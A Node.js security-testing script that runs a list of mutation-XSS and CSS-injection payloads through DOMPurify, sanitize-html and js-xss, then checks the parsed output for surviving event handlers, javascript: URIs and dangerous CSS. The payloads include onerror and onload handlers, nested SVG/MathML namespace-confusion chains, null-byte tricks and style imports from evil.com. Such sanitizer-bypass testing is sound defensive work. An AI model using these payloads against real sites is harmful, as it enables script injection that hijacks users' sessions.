"use strict";
/**
 * Deep mXSS analysis - distinguishes real vulnerabilities from false positives
 * Checks if dangerous patterns are in actual HTML context vs entity-encoded text
 */
const { JSDOM } = require("jsdom");
const window = new JSDOM("").window;
const DOMPurify = require("dompurify")(window);
const sanitizeHtml = require("sanitize-html");
const xss = require("xss");

// Check if output contains ACTUAL (non-encoded) dangerous patterns
function hasRealDanger(output) {
  const findings = [];

  // Parse as DOM and check for actual dangerous attributes/elements
  const dom = new JSDOM(output);
  const doc = dom.window.document;

  // Check all elements for event handlers
  const all = doc.querySelectorAll("*");
  for (const el of all) {
    for (const attr of el.attributes) {
      if (/^on/i.test(attr.name)) {
        findings.push({ type: "event_handler", element: el.tagName, attr: attr.name, value: attr.value.slice(0, 50) });
      }
      if (/^(href|src|action|formaction|data|poster|background)$/i.test(attr.name)) {
        if (/^\s*javascript\s*:/i.test(attr.value)) {
          findings.push({ type: "javascript_uri", element: el.tagName, attr: attr.name, value: attr.value.slice(0, 50) });
        }
        if (/^\s*data\s*:\s*text\/html/i.test(attr.value)) {
          findings.push({ type: "data_html_uri", element: el.tagName, attr: attr.name, value: attr.value.slice(0, 50) });
        }
        if (/^\s*vbscript\s*:/i.test(attr.value)) {
          findings.push({ type: "vbscript_uri", element: el.tagName, attr: attr.name, value: attr.value.slice(0, 50) });
        }
      }
    }
    // Check for <script> elements
    if (el.tagName === "SCRIPT") {
      findings.push({ type: "script_element", content: el.textContent.slice(0, 50) });
    }
  }

  // Check <style> elements for dangerous CSS
  const styles = doc.querySelectorAll("style");
  for (const s of styles) {
    const css = s.textContent;
    if (/expression\s*\(/i.test(css)) findings.push({ type: "css_expression", css: css.slice(0, 80) });
    if (/-moz-binding\s*:/i.test(css)) findings.push({ type: "css_moz_binding", css: css.slice(0, 80) });
    if (/@import\s+["']?javascript/i.test(css)) findings.push({ type: "css_import_js", css: css.slice(0, 80) });
    if (/url\s*\(\s*javascript/i.test(css)) findings.push({ type: "css_url_js", css: css.slice(0, 80) });
    if (/@import\s+["']?\/\//i.test(css)) findings.push({ type: "css_external_import", css: css.slice(0, 80) });
    if (/url\s*\(\s*\/\//i.test(css)) findings.push({ type: "css_external_url", css: css.slice(0, 80) });
    if (/@import\s+["']?https?:/i.test(css)) findings.push({ type: "css_external_import", css: css.slice(0, 80) });
    if (/behavior\s*:\s*url/i.test(css)) findings.push({ type: "css_behavior", css: css.slice(0, 80) });
  }

  return findings;
}

const SANITIZERS = {
  "DOMPurify": (html) => DOMPurify.sanitize(html),
  "DOMPurify+SAFE_TPL": (html) => DOMPurify.sanitize(html, { SAFE_FOR_TEMPLATES: true }),
  "DOMPurify+RETURN_DOM": (html) => {
    const clean = DOMPurify.sanitize(html, { RETURN_DOM: true });
    return clean.innerHTML;
  },
  "sanitize-html": (html) => sanitizeHtml(html),
  "sanitize-html+permissive": (html) => sanitizeHtml(html, {
    allowedTags: sanitizeHtml.defaults.allowedTags.concat(["svg", "math", "style", "img", "video", "audio"]),
    allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, "*": ["style", "class", "id"] },
  }),
  "js-xss": (html) => xss(html),
  "js-xss+whiteList": (html) => xss(html, {
    whiteList: { ...xss.whiteList, svg: [], math: [], style: [], img: ["src", "alt"], a: ["href", "title"] },
  }),
};

// Focused test cases targeting REAL vulnerabilities
const TESTS = [
  // DOMPurify CSS injection vectors
  { name: "DOMPurify: SVG style CSS expression",
    input: '<svg><style>*{x:expression(alert(1))}</style></svg>' },
  { name: "DOMPurify: SVG style @import javascript",
    input: '<svg><style>@import "javascript:alert(1)"</style></svg>' },
  { name: "DOMPurify: SVG style -moz-binding",
    input: '<svg><style>*{-moz-binding:url(javascript:alert(1))}</style></svg>' },
  { name: "DOMPurify: SVG style url(javascript:)",
    input: '<svg><style>*{background:url(javascript:alert(1))}</style></svg>' },
  { name: "DOMPurify: SVG style external @import",
    input: '<svg><style>@import "//evil.com/xss.css"</style></svg>' },
  { name: "DOMPurify: SVG style external url()",
    input: '<svg><style>*{background:url(//evil.com/tracker.png)}</style></svg>' },
  { name: "DOMPurify: SVG style behavior",
    input: '<svg><style>*{behavior:url(#default#userData)}</style></svg>' },
  { name: "DOMPurify: Table style CSS injection",
    input: '<table><style>*{background:url(javascript:alert(1))}</style></table>' },
  { name: "DOMPurify: Standalone style CSS injection",
    input: '<style>*{background:url(javascript:alert(1))}</style>' },
  { name: "DOMPurify: MathML style CSS injection",
    input: '<math><style>*{x:expression(alert(1))}</style></math>' },

  // DOMPurify config variants
  { name: "DOMPurify+ALLOW_TAGS: style with expression",
    input: '<div><style>*{x:expression(alert(1))}</style></div>',
    configs: { "DOMPurify+ALLOW_STYLE": (html) => DOMPurify.sanitize(html, { ADD_TAGS: ["style"] }) } },

  // sanitize-html with permissive config
  { name: "sanitize-html: SVG title namespace confusion",
    input: '<svg><title><body><img src=x onerror=alert(1)></body></title></svg>' },
  { name: "sanitize-html: permissive + SVG style",
    input: '<svg><style>*{x:expression(alert(1))}</style></svg>' },

  // js-xss with custom whitelist
  { name: "js-xss: image tag transform",
    input: '<image src=x onerror=alert(1)>' },
  { name: "js-xss: base href javascript",
    input: '<base href="javascript:alert(1)//">' },

  // Non-idempotent DOMPurify test - double sanitize
  { name: "DOMPurify non-idempotent: SVG foreignObject chain",
    input: '<svg><foreignObject><math><mtext><table><mglyph><style><!--</style><svg onload=alert(1)>--></mglyph></table></mtext></math></foreignObject></svg>',
    doubleCheck: true },
  { name: "DOMPurify non-idempotent: nested math-style",
    input: '<math><mtext><table><mglyph><style><math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math></style></mglyph></table></mtext></math>',
    doubleCheck: true },

  // Edge cases: self-closing and malformed
  { name: "Self-closing SVG style",
    input: '<svg><style/><img src=x onerror=alert(1)></svg>' },
  { name: "Null byte in tag name",
    input: '<scr\x00ipt>alert(1)</scr\x00ipt>' },
  { name: "Null byte in attribute",
    input: '<img src=x on\x00error=alert(1)>' },
];

console.log("=" .repeat(80));
console.log("DEEP mXSS ANALYSIS - DOM-PARSED VERIFICATION");
console.log("=" .repeat(80));

const allBypass = [];

for (const test of TESTS) {
  console.log(`\n${"─".repeat(70)}`);
  console.log(`TEST: ${test.name}`);
  console.log(`INPUT: ${test.input.slice(0, 100)}${test.input.length > 100 ? '...' : ''}`);

  const sanitizers = test.configs ? { ...SANITIZERS, ...test.configs } : SANITIZERS;

  for (const [name, sanitize] of Object.entries(sanitizers)) {
    try {
      const output = sanitize(test.input);
      const dangers = hasRealDanger(output);

      if (dangers.length > 0) {
        allBypass.push({ test: test.name, sanitizer: name, dangers });
        console.log(`  [BYPASS] ${name}:`);
        for (const d of dangers) {
          console.log(`    → ${d.type}: ${JSON.stringify(d)}`);
        }
        console.log(`    Output: ${output.slice(0, 120)}`);
      } else {
        console.log(`  [SAFE] ${name}`);
      }

      // Double-sanitize check
      if (test.doubleCheck && name.startsWith("DOMPurify")) {
        const output2 = sanitize(output);
        const dangers2 = hasRealDanger(output2);
        if (output !== output2) {
          console.log(`  [MUTATION] ${name} double-sanitize: output changed!`);
          console.log(`    P1: ${output.slice(0, 100)}`);
          console.log(`    P2: ${output2.slice(0, 100)}`);
          if (dangers2.length > 0) {
            console.log(`    [CRITICAL] Pass 2 has dangers: ${JSON.stringify(dangers2)}`);
            allBypass.push({ test: test.name + " (double-sanitize)", sanitizer: name, dangers: dangers2 });
          }
        }
      }
    } catch (e) {
      console.log(`  [ERROR] ${name}: ${e.message}`);
    }
  }
}

console.log(`\n${"=".repeat(80)}`);
console.log("VERIFIED BYPASSES (DOM-parsed, not text-pattern matching)");
console.log("=".repeat(80));

if (allBypass.length === 0) {
  console.log("No real bypasses found.");
} else {
  // Group by sanitizer
  const bySanitizer = {};
  for (const b of allBypass) {
    const key = b.sanitizer;
    if (!bySanitizer[key]) bySanitizer[key] = [];
    bySanitizer[key].push(b);
  }

  for (const [sanitizer, bypasses] of Object.entries(bySanitizer)) {
    console.log(`\n${sanitizer} (${bypasses.length} bypasses):`);
    for (const b of bypasses) {
      const types = [...new Set(b.dangers.map(d => d.type))].join(", ");
      console.log(`  - ${b.test}: ${types}`);
    }
  }
}

console.log(`\nTotal verified bypasses: ${allBypass.length}`);
